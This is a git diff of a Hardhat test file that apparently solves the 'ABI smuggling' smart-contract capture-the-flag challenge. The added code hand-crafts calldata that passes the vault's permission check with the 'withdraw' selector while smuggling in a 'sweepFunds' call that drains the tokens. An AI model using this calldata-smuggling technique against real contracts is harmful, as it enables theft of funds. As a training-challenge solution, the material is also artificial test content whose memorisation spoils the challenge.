@@ -43,65 +43,59 @@ describe('[Challenge] ABI smuggling', function () {
         ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
     });
 
+    /**
+     * @dev
+     * Exploit overview
+     * 
+     * The exploit in this challenge is this little bit of code here is when
+     * the AuthorizedExecutor retrieves the selector from the actionData parameter
+     * 
+     */
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
         
         //  Deployer can sweep
-        console.log(vault.interface.getSighash("sweepFunds"));
-
+        expect(vault.interface.getSighash("sweepFunds"), "0x85fb709d");
         //  Player can withdraw
-        console.log(vault.interface.getSighash("withdraw"));
+        expect(vault.interface.getSighash("withdraw"), "0xd9caed12");
 
-       const attackVault = await vault.connect( player);
+       const attackVault = await vault.connect(player);
        const attackToken = await token.connect(player);
        
-
         /**
-         * Adress will go
+         * Addresses of calldata for exploit
          * 
          * Function Selector: 0x00 
          * Target: 0x04
          * Bytes Location: 0x24
-         * Bytes Length: 0x44
-         * FS fake: 0x64
-         * FS real: 0x68
-         * actualdata: 0x72
+         * Null Byte: 0x44
+         * FS Fake: 0x64
+         * Bytes Length: 0x84
+         * FS real: 0xA4
+         * actualdata: 0xA8
          */
 
-        const createInterface = (signature, methodName, arguments) => {
-            const ABI = signature;
-            const IFace = new ethers.utils.Interface(ABI);
-            const ABIData = IFace.encodeFunctionData(methodName, arguments);
-            return ABIData;
-        }
-
-        const vaultInt = ["function sweepFunds(address receiver, address token)"]
-        const vaultABI = createInterface(vaultInt, "sweepFunds", [player.address, attackToken.address])
-
-        console.log("sweep ABI");
-        console.log(vaultABI);
-
-        const res = attackVault.interface.encodeFunctionData("execute", [attackVault.address, vaultABI]);
-        console.log("final");
-        console.log(res);
-// token recipient amount
-        const fnData = ethers.utils.hexZeroPad(player.address, 32).slice(2)
-                     + ethers.utils.hexZeroPad(attackToken.address, 32).slice(2) 
-
-        // console.log(fnData);
-        // console.log(ethers.utils.hexZeroPad(attackToken.address));
 
         const executeFs = vault.interface.getSighash("execute")
         const target = ethers.utils.hexZeroPad(attackVault.address, 32).slice(2);
-        const bytesLocation = ethers.utils.hexZeroPad("0x68", 32).slice(2); // address of actual data
-        // TODO: fill in when actual data bytes is known
-        const bytesLength = ethers.utils.hexZeroPad("0x02", 32).slice(2)
-        const fnSelectorFake = "" // "0xd9caed12".slice(2);
+        const bytesLocation = ethers.utils.hexZeroPad("0x80", 32).slice(2); // address of actual data
+        const bytesLength = ethers.utils.hexZeroPad("0x44", 32).slice(2)
+        const fnSelectorFake =  "0xd9caed12".slice(2);
         const fnSelectorReal = "0x85fb709d".slice(2);
-        // TODO: put data
-        const payload = executeFs + target + bytesLocation + bytesLength + fnSelectorFake + fnSelectorReal + fnData;
-        console.log(payload);
+        const fnData = ethers.utils.hexZeroPad(recovery.address, 32).slice(2)
+                     + ethers.utils.hexZeroPad(attackToken.address, 32).slice(2) 
 
+        const payload = executeFs + 
+                        target + 
+                        bytesLocation + 
+                        ethers.utils.hexZeroPad("0x0", 32).slice(2) +
+                        fnSelectorFake + ethers.utils.hexZeroPad("0x0", 28).slice(2) +
+                        bytesLength + 
+                        fnSelectorReal + 
+                        fnData 
+        
+        console.log("Payload:")
+        console.log(payload);
 
         await player.sendTransaction(
             {
